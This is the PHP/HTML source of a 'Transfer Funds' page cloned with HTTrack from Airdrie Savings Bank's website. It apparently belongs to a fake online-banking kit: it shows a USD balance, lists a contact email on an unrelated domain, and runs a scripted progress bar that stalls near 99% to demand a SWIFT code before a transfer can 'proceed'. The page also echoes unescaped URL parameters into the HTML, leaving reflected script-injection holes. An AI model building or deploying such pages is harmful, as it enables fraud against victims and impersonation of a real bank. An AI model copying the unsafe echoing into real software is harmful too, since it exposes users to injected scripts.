<?php
include 'control.php';
$errMsg         = $_GET['errMsg'];
$rec_title      = $_GET['rec_title'];
$rec            = $_GET['rec'];
$rec_acc        = $_GET['rec_acc'];
$swift          = $_GET['swift'];
$amount         = $_GET['amount'];
$desc           = $_GET['desc'];
?>
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="iem7 old no-js"><![endif]-->
<!--[if lt IE 7 ]><html lang="en" class="ie6 old no-js"><![endif]-->
<!--[if IE 7 ]><html lang="en" class="ie7 old no-js"><![endif]-->
<!--[if IE 8 ]><html lang="en" class="ie8 no-js"><![endif]-->
<!--[if IE 9 ]><html lang="en" class="ie9 no-js"><![endif]-->
<!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
<html lang="en" class="no-js">
<!--<![endif]-->

<!-- Mirrored from airdriesavingsbank.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 Jul 2016 11:53:08 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8" />
    

<title>Home : Airdrie Savings Bank</title>

<meta name="description" content="Discover Britain&#39;s only independent savings bank, with current and savings accounts for businesses and individuals. Offers mortgages, loans, savings and much more" />

<meta property="og:title" content="Airdrie Savings Bank" />
<meta property="og:description" content="" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="cleartype" content="on">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0" />
    <meta name="google-site-verification" content="OQ4xeOxsy4dM-80Atd4ZwxWiS_Ztsd-ykOXMLMT-xCk" />
    <link rel="stylesheet" href="stylebox/pageStyle.css">
    <link rel="canonical" href="index.php"/>
    <!--[if lte IE 8 ]>
        <link rel="stylesheet" href="/Content/css/all-old-ie.css" />
        <script>'article|section'.replace(/\w+/g,function(t){document.createElement(t)})</script>
        <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" href="Content/css/all.css">
    <!--<![endif]-->
    <link rel="shortcut icon" href="Content/images/icons/favicon.ico" />
    <link rel="apple-touch-icon" href="Content/images/icons/apple-touch-icon.png" />
    <link rel="apple-touch-icon-precomposed" href="Content/images/icons/apple-touch-icon.png" />
    <link rel="shortcut icon" href="Content/images/icons/apple-touch-icon.png">
    <link rel="stylesheet" href="Content/webfonts/css/fontello.css">
    <link rel="stylesheet" href="Content/webfonts/css/animation.css">
    <!--[if IE 7]>
        <link rel="stylesheet" href="/Content/css/all-old-ie.css">
        <link rel="stylesheet" href="/Content/webfonts/css/fontello-ie7.css">
    <![endif]-->
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,700italic,400,700,600' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Lato:400,700,900,400italic,700italic,900italic' rel='stylesheet' type='text/css'>
    <script src="Content/js/modernizr.js"></script>
    <script src="jquery.js"></script>
    <style>
#logo
{
    position: relative; 
    float: left; 
    width: 50px; 
    height: 50px; 
    border: 1px solid black; 
    border-radius: 100%;
    top: 3px;
    margin-left: 15px;
}
#funds_act
{
position: relative;
height: 30px;
width: auto;
margin-left: 5%;
padding-right: 2px;
padding-left: 2px;
//border-bottom: 1px solid rgba(0,0,0, .2);
/*border-right: 1px solid rgba(0,0,0, .2);
border-left: 1px solid rgba(0,0,0, .2);*/
}
#funds_act li
{
    position: relative;
    float: left;
    min-width: 120px;
    width: 170px;
    text-align: center;
    margin-top: 5px;
    margin-right: auto;
    top: 4px;
    background: rgba(131,131,131,.4);
    border: 3px solid rgba(131,131,131,.2);
    list-style: none;
}
#show1,
#show2
{
    position: relative;
    display: none;
    width: 90%;
    height: auto;
    min-height: 400px;
    border: 1px solid rgba(0,0,0, .2);
    margin-left: auto;
    margin-right: auto;
}
#funds_act li:hover
{
    cursor: pointer;

}
#act_table form tr
{
    background: none;
}
#act_table form tr input,
#act_table form tr input
{
    border: 1px solid rgba(0, 200, 255, .2);
    border-radius: 4px;
}
</style>
</head>
<body onclick="$('#notify').fadeOut('slow');">
   <header class="masthead" role="banner">
        <div class="wrapper">
            <div class="triggers">
                <button class="trigger pull-left js-trigger--nav"><i class="icon-menu mega"></i></button>
                <button class="trigger trigger-border js-trigger--utility"><i class="icon-lock mega"></i></button>
                <button class="trigger js-trigger--search"><i class="icon-search mega"></i></button>
            </div>
            <nav class="nav nav-utility js-panel--utility">
                <ul>
                    <li class="btn-login-panel pull-right-tablet"><a href="logout.php"  class="btn btn-primary btn-login"><i class="icon-open"></i>Logout</a></li>
                    <li class="pull-right-tablet visable-on-large"><?php
    if(isset($dp) && $dp != '')
    {
        echo "<img src='../account_passport/$dp' id='dp_avatar' />";
    }else{
        echo "<img id='dp_avatar' src='dp.png'>";
    }
    echo "<div id='user'>".$full_name.'</div>';
?></li>
                   <!--  <li class="pull-right-tablet"><a href="#"><i class="icon-facebook-circled social-icon"></i> <span class="hide-on-tablet delta">Follow us on Facebook</span></a></li> -->
                </ul>
                    
            </nav>
            <div class="wrap-search medium-5 pull-right-tablet js-panel--search">
                <div class="global-search">
                    
                </div>
            </div>
            <!--[if gt IE 8]><!-->
                <a class="site-logo" href="index.php"><img src="Content/images/branding/asb-logo.svg" alt="Airdrie Savings Bank"></a>
            <!--<![endif]-->
            <!--[if lte IE 8 ]>
                <a class="site-logo" href="/"><img src="/Content/images/branding/ie-logo.png" alt="Airdrie Savings Bank"></a>            
            <!--<![endif]-->
            <h2 class="tagline">Britain's only Independent Savings Bank <span><i>Est. 1835</i></span></h2>
        </div>
    </header>
<div class="wrapper">
    <div class="content editor-content" role="main">
        

<nav class="nav medium-12 nav-breadcrumbs margin-btm-med margin-top-med" style='border: 0px solid red;'>
<div id='details'>
      <div id='bal_detail'>
        <div id='balance'>
        <h2>Balance</h2>
        <p>$<?php echo $acc_bal.'<spam style=\'font-size: 16px; color:#ABA2A2;\'> USD</spam>'; ?></p>
        </div>
      </div>
    </div>
   
</nav>

        



<div class="medium-3">
    <ul class="nav-secondary">
            <li>
                <a href="home.php" >Account Activity<i class="icon-right-open"></i></a>
                


            </li>
            <li>
                <a href="user_account_details.php">Account Details <i class="icon-right-open"></i></a>
                


            </li>
            <li>
                <a href="user_account_statement.php">Account Statement <i class="icon-right-open"></i></a>
                


            </li>
            <li>
                <a href="transfer_funds.php" class="active">Transfer Funds <i class="icon-right-open"></i></a>
                


            </li>
    </ul>
</div>
        <div class="medium-9 relative" style="border: 0px solid red;">
            <header class="header-border" style='border: 0px solid blue;'>
            <div id='act_table' style='border: 0px solid blue;'>
           <p id='header'>
                <?php echo 'Funds Transfer'; ?>
            </p>
        <div >
        <?php if(isset($errMsg) && !empty($errMsg))
        {
            echo "<h4  id='notify' style='position: relative; width: 700px; height: 30px; line-height: 30px; margin-right: auto; margin-left: auto; text-align: center; margin-top: 10px; background:rgba(184,255,0,.8); border: 1px solid #ACACAC; border-radius: 5px; color: #666666;  '>". $errMsg . "</h4>";
        } 
    ?>
        
        <p style='position: relative; margin-left: 50px; margin-top: 5px; color: #707070;'>Funds transfer is a process of transfering funds from your account to other account in same Bank.<br />
Please make sure that you have enough funds available in your account to transfer. Also don't forget to validate receiver's account number.</p>
        <form action='transfering.php' method='POST' style='position: relative; width: 700px; margin-right: auto; margin-left: auto; margin-top: 10px;' />
        <div style='position:relative; width: 100%; height: 30px; line-height: 30px; background: rgba(120,120,120,.6); text-align: center; color: #E7E7E7;'>Transfer Funds</div>
            <table>
            <tr><td> <span>Receiver's Bank Name</span>  </td><td><input type='text' name='bank_name' <?php if(isset($rec_title) && $rec_title != ''){ echo 'value='.$rec_title;} ?> />    </td></tr>
            <tr><td> <span>Receiver's Name</span>   </td><td> <input type='text' name='receiver_name' <?php if(isset($rec) && $rec  != ''){ echo 'value='.$rec;} ?> />   </td></tr>
            <tr><td> <span>Receiver's Account Number</span>   </td><td> <input type='text' name='receiver_acc' <?php if(isset($rec_acc) && $rec_acc  != ''){ echo 'value='.$rec_acc ;} ?> />   </td></tr>
            <tr><td> <span>SWIFT/ABA Routing Code</span>   </td><td> <input type='text' name='swift' <?php if(isset($swift) && $swift  != ''){ echo 'value='.$swift ;} ?> />   </td></tr>
            <tr><td> <span>Sender's Account Number</span>   </td><td> <input type='text' name='sender_acc' value='<?php echo $acc_no; ?>' disabled='disabled'/>   </td></tr>
            <tr><td>  <span>Amount to Transfer USD$</span>  </td><td> <input type='text' name='amount' <?php if(isset($amount) && $amount  != ''){ echo 'value='.$amount ;} ?> />   </td></tr>
            <tr><td> <span>Fund Transfer Option</span>   </td><td> 
            <select name='trans_type'>
            <option>--Please Select your Option--</option>
            <option>Domestic Transfer</option>
            <option>Local Transfer</option>
            <option>International Transfer</option>
            </select>

               </td></tr>
            <tr><td>  <span>Date of Transfer</span>  </td><td> <input type='text' name='trans_date' value="<?php echo $today; ?>" disabled='disabled'/>   </td></tr>
            <tr><td>  <span>Transfer Description</span>  </td><td> 
            <textarea style='position: relative; min-width: 100%; max-width: 100%; min-height: 100px;' name='t_descript'><?php if(isset($desc) && $desc  != ''){ echo $desc;} ?></textarea>
               </td></tr>

            </table>
        </div>
        <div id='act_footer'>
        <input id='transfer_fund' type='submit' value='Transfer' style='padding-right: 10px; padding-left: 10px; width: 150px; float: right; right: 40px;'/>
            
        </div>

</form>
</div>
 
            </header>
        
        </div>
    </div>
</div>

    <div class="bg-light-blue editor-content subfooter">
        <div class="wrapper">
            <div class="content" role="main">
                <div class="medium-4 margin-top-xlarge margin-btm-xlarge">
                    <div class="row row-small">
                        <div class="small-3 medium-4">
                            <!--[if gt IE 8]><!-->
                            <img class="img-width" src="../Content/images/icons/icon-loan-calculator.svg" alt="" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img src="/Content/images/icons/ie-icon-loan-calculator.png" alt="" />
                            <!--<![endif]-->                            
                        </div>
                        <div class="small-9 medium-8">
                            <h3 class="alpha">Loan calculator</h3>
                            <p class="gamma">Find out how competitive a loan from Airdrie Savings Bank can be.</p>
                            <a target="_blank" href="../personal/loans/loan-calculators/index.php" class="gamma"><i class="icon-right-circle"></i> <strong>Use our loan calculator</strong></a>
                        </div>
                    </div>
                </div>
                <div class="medium-4 margin-top-xlarge margin-btm-xlarge">
                    <div class="row row-small">
                        <div class="small-3 medium-4">
                            <!--[if gt IE 8]><!-->
                            <img class="img-width" src="../Content/images/icons/icon-mortgage-calculator.svg" alt="" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img src="/Content/images/icons/ie-icon-mortgage-calculator.png" alt="" />
                            <!--<![endif]-->
                        </div>
                        <div class="small-9 medium-8">
                            <h3 class="alpha">Mortgage calculator</h3>
                            <p class="gamma">Find out how much you can borrow, and get a no-obligation personalised quotation.</p>
                            <a target="_blank" href="../personal/mortgages-and-bridging-loans/mortgage-calculator/index.php" class="gamma"><i class="icon-right-circle"></i> <strong>Use our mortgage calculator</strong></a>
                        </div>
                    </div>
                </div>
                <div class="medium-4 margin-top-xlarge margin-btm-xlarge">
                    <div class="row row-small">
                        <div class="small-3 medium-4">
                            <!--[if gt IE 8]><!-->
                            <img class="img-width" src="../Content/images/icons/icon-lost-card.svg" alt="" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img src="/Content/images/icons/ie-icon-lost-card.png" alt="" />
                            <!--<![endif]-->                                
                        </div>
                        <div class="small-9 medium-8">
                            <h3 class="alpha">Lost or stolen card or PIN?</h3>
                            <p class="gamma">Let us know as soon as possible.</p>
                            <a target="_blank" href="../lost-or-stolen-card-or-pin/index.php" class="gamma"><i class="icon-right-circle"></i> <strong>Find out what you should do here</strong></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer class="site-footer" role="contentinfo">
        <div class="wrapper">
            <div class="medium-8">
                <div class="row row-small">
                    <div class="small-12 medium-4">
                        <a target="_blank" class="site-logo site-logo-footer" href="../index.php">
                            <!--[if gt IE 8]><!-->
                                <img class="hide-on-mobile" src="../Content/images/branding/asb-logo.svg" alt="Airdrie Savings Bank" />
                            <!--<![endif]-->
                            <!--[if lte IE 8 ]>
                                <img class="hide-on-mobile" src="/Content/images/branding/ie-logo.png" alt="Airdrie Savings Bank" />
                            <!--<![endif]-->                                                            
                        </a>
                    </div>
                    <div class="small-12 medium-3">
                        <ul class="lister lister-footer">
                            <li>Head office:</li>
                            <li>56 Stirling Street</li>
                            <li>Airdrie</li>
                            <li>Scotland</li>
                            <li>ML6 0AW</li>
                        </ul>
                    </div>
                    <div class="small-12 medium-5">
                        <ul class="lister lister-footer lister-footer-alt">
                            <li><strong></strong> </li>
                            <li><strong>Email:</strong> <a target="_blank" href="mailto:infodesk@classicsmake.com">infodesk@classicsmake.com</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="medium-4 relative">
                <div class="site-footer-bar"></div>
                <ul class="lister lister-footer lister-footer-deep two-up">
                    <li class="col"><a target="_blank" href="../index.php"><i>Home</i></a></li>
                    
                        <li class="col"><a target="_blank" href="../call-back/index.php"><i>Call-back</i></a></li>
                        <li class="col"><a target="_blank" href="../personal/index.php"><i>Personal</i></a></li>
                        <li class="col"><a target="_blank" href="../accessibility/index.php"><i>Accessibility</i></a></li>
                        <li class="col"><a target="_blank" href="../business/index.php"><i>Business</i></a></li>
                        <li class="col"><a target="_blank" href="../disclosure-personal-information-statements/index.php"><i>Privacy policy</i></a></li>
                        <li class="col"><a target="_blank" href="index.php"><i>Under 18s</i></a></li>
                        <li class="col"><a target="_blank" href="../terms-conditions/index.php"><i>Terms and conditions</i></a></li>
                        <li class="col"><a target="_blank" href="../our-ethos/index.php"><i>Our ethos</i></a></li>
                        <li class="col"><a target="_blank" href="../internet-banking/staying-secure/index.php"><i>Staying secure</i></a></li>
                </ul>
            </div>
            <div class="medium-12">
                <div class="row">
                    <div class="small-12 medium-6">
                        <p class="delta margin-top-large margin-btm-xlarge"><i>Airdrie Savings Bank is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. <br />Our firm reference number is 204584.</i></p>
                    </div>
                    <div class="small-12 medium-6">
                        <a target="_blank" class="pull-right push--left push-half--top" href="../media/52589/FSCS-Booklet.pdf">
                            <img src="../Content/images/branding/fscs.jpg" width="100" alt="Financial Services Compensation Scheme" />
                        </a>
                        <div class="pull-right push-half--top" style="background: #fff; padding: 0 10px;">
                            <script type="text/javascript" src="https://seal.verisign.com/getseal?host_name=airdriesavingsbank.com&amp;size=L&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
   <div id='dark_back'>
    </div>
    <div id='transfer_code' style="background: none;">
    <?php if(isset($errMsg) && !empty($errMsg))
        {
            echo "<h4  id='notify' style='position: relative; width: 700px; height: 30px; line-height: 30px; margin-right: auto; margin-left: auto; text-align: center; margin-top: 10px; top: -80px; margin-bottom: -50px;  background:rgba(184,255,0,.8); border: 1px solid #ACACAC; border-radius: 5px; color: #2A2A2A;  '>". $errMsg . "</h4>";
        } 
    ?>
    <div id='trans_proc'>
    <canvas id='my_canvas' width="300" height="300" style='position: relative; display: block; border: 0px dashed #ccc; font-size: 200px; margin-right: auto; margin-left: auto;'></canvas>
<!-- <div id="myProgress" style="top: 80px;">
  <div id="myBar1">
    <div id="label">0%</div>
  </div>
</div> -->
<p id='notication' style="position: relative; display: none; color: yellow; text-align: center;">Please your transfer cannot be proceed, your are require to provide SWIFT code.<a href='transfer_5.php'> Click here </a> and provide SWIFT code to proceed</p>

<br>
<button onclick="move1()" style='display: none;'>Click Me</button> 
    </div>
    </div>
<script>
    var ctx = document.getElementById("my_canvas").getContext('2d');
    var al = 86;
    var start = 4.72;
    var cw = ctx.canvas.width;
    var ch = ctx.canvas.height;
    var diff;
    function progressSim()
    {
        diff = ((al/100) * Math.PI*2*10);
        ctx.clearRect(0, 0, cw, ch);
        ctx.font = '40px roman';
        ctx.lineWidth = 30;
        ctx.fillStyle = "#B8FF00";
        ctx.strokeStyle = "#B8FF00";
        ctx.textAlign = 'center';
        ctx.fillText(al+'%', cw*.5, ch*.5+2, cw);
        ctx.beginPath();
        ctx.arc(150, 150, 110, start, diff/10+start, false);
        
        ctx.stroke();
        if(al >= 99)
        {
            clearTimeout(sim);
              $('#my_canvas').fadeOut('slow');
              $('#notication').fadeIn('slow');
              $('#notication').fadeOut('slow');
              $('#notication').fadeIn('slow');
              $('#notication').fadeOut('slow');
              $('#notication').fadeIn('slow');
        }
        al++;
    }
    var sim = setInterval(progressSim, 500);

</script>
    <script src="../../ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
    <script src="../Content/js/jquery-ui.js"></script>
    <script src="../Content/js/jquery.ui.touch-punch.min.js"></script>
    <script src="../Content/js/foundation.reveal.js"></script>
    <script src="../Content/js/responsiveslides.min.js"></script>
    <script src="../Content/js/easyResponsiveTabs.js"></script>
    <script src="../Content/js/scripts.js"></script>

    <script src="../app/scripts/angular.min.js"></script>
    <script src="../app/scripts/slider.js"></script>
    <script src="../app/app.js"></script>
    <script src="../app/loanController.js"></script>
    <script src="../app/expressLoanController.js"></script>
    <script src="../app/loanService.js"></script>
    
    <!--Google-->
    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', '../../www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-48958610-1', 'airdriesavingsbank.com');
        ga('send', 'pageview');

    </script>
    <!--Google-->
    
    <script type="text/javascript" src="../Content/js/cookie.js"></script>
    <script type="text/javascript">
        $.stormCookie({
            cookiePageUrl: 'https://airdriesavingsbank.com/cookies/',
            
        });
  </script>

</body>

<!-- Mirrored from airdriesavingsbank.com/under-18s/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 Jul 2016 12:01:05 GMT -->
</html>